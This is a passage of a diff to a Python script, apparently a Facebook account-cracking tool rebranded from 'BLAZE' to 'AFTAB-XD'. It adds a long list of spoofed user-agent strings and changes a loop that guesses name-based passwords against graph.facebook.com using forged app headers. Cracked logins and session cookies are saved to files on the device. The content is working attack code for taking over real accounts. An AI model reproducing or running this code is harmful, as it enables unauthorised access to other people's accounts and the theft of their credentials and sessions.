+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25
+Mozilla/5.0 (Linux; Android 9.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2821.146 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 8.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2438.124 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 9.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.2325.100 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 3.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.2737.108 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 8.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.2691.103 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 6.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.2694.86 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 3.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.2854.131 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 9.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2746.80 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 4.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2684.125 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 4.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.2458.89 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 4.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.2516.140 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 6.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2692.150 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 8.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2722.79 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 4.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.2888.86 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 9.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.2348.116 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 8.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.2755.98 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 7.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2742.149 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 9.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.2304.134 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 8.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.2698.140 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 4.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.2409.115 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 5.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.2851.96 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 9.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.2673.94 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 8.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2376.82 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 5.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.2641.83 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 7.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2869.130 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 6.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2500.149 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 7.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2875.109 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 3.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2635.124 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 3.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.2692.123 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 7.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2591.87 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 5.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.2723.120 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 7.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.2468.108 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 6.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.2731.138 Mobile Safari/537.36
+"""
+####
+
+
 def method():
     okacc = []
     cpacc = []
@@ -981,7 +1472,7 @@ def method():
     os.system("clear")
     print(logo) 
     print(f'[•] Total Ids : \033[1;92m'+str(len(accounts)))
-    print(f"\033[1;91m[•] USE FLIGHT MODE FOR MORE ID")
+    print(f"\033[1;91m[•] If you no result use ✈️ ✈️ flight mode ✈️ ✈️")
     linex()
     
     def method1(user):
@@ -999,7 +1490,7 @@ def method():
         sys.stdout.write('\r \033[1;97m[\033[1;97mAFTAB-XD\033[1;97m]\033[1;97m {}|{} \033[1;92m|{} \033[1;91m|{}       \r'.format(str(loop), str(len(accounts)), str(len(okacc)) ,str(len(cpacc))))
         sys.stdout.flush()
         for pword in totalpass:              
-            heads = "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36"
+            heads = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
             header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
             pword = pword.replace("first", first).replace("last", last)
             pword = pword.lower()
@@ -1008,8 +1499,8 @@ def method():
       #      print(response.text)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;92m [BLAZE-Ok] '+acc+'| '+pword+'')
-                open('/sdcard/BLAZE-Ok.txt','a').write(f'{acc}|{pword}\n ')
+                print('\r\033[1;92m [AFTAB-Ok] '+acc+'| '+pword+'')
+                open('/sdcard/AFTAB-Ok.txt','a').write(f'{acc}|{pword}\n ')
                 if c=='y':
                     try:
                            q = json.loads(response.text)
@@ -1018,14 +1509,14 @@ def method():
                            cookies = f"sb={ssbb};{ckkk}"
                     except Exception as e:print(str(e)+' | '+response.text)
                 print(' \033[1;97m'+cookies)
-                open('/sdcard/BLAZE-COOKIE.txt','a').write(f'{acc}|{pword}\n{cookies} ')    
+                open('/sdcard/PRO-COOKIE.txt','a').write(f'{acc}|{pword}\n{cookies} ')    
                 
                 break
             elif 'www.facebook.com' in response.text:
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\033[1;97m [BLAZE-CP] '+acc+'| '+pword+'')
+                     print('\r\033[1;97m [AFTAB-CP] '+acc+'| '+pword+'')
                 cpacc.append(acc)
                 open('/sdcard/AFTAB-CP.txt','a').write(f'{acc} • {pword}\n')
                 break
@@ -1049,7 +1540,7 @@ def method():
         except:
             last = first
         pers = str(int(loop)/int(len(accounts)) * 100)[:4]
-        sys.stdout.write('\r \033[1;97m[\033[1;97BLAZE-XD\033[1;97m]\033[1;97m {}|{} \033[1;92m|{} \033[1;91m|{}       \r'.format(str(loop), str(len(accounts)), str(len(okacc)) ,str(len(cpacc))))
+        sys.stdout.write('\r \033[1;97m[\033[1;97mAFTAB-XD\033[1;97m]\033[1;97m {}|{} \033[1;92m|{} \033[1;91m|{}       \r'.format(str(loop), str(len(accounts)), str(len(okacc)) ,str(len(cpacc))))
         sys.stdout.flush()
         for pword in totalpass:
             heads = "Mozilla/5.0 (Linux; Android 12; SM-A536B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.76 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]"
